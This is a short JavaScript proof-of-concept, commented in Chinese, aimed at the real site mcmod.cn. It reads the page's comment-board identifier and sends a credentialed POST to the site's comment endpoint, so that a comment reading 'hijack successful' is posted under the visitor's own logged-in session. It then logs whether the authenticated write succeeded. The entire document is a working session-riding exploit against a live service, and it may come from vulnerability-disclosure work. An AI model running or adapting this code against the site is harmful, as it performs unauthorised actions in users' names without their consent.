(function () {
    var type = window.comment_type || 'center';
    var container = window.comment_container || (window.nCenterID != null ? String(window.nCenterID) : null);
    if (!container) { console.warn('[poc] 当前页面未找到留言板标识'); return; }
    fetch('https://www.mcmod.cn/action/doComment/', {
        method: 'POST',
        credentials: 'include',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8' },
        body: 'data=' + encodeURIComponent(JSON.stringify({
            todo: 'submit', type: type, channel: '1', container: container, quote: 0, text: '<p>劫持生效</p>'
        }))
    })
        .then(function (r) { return r.text(); })
        .then(function (t) { console.log('[poc] 以当前会话写入短评 => ', t, '(state 0 即认证写操作成功)'); })
        .catch(function (e) { console.log('[poc] 失败:', e); });
})();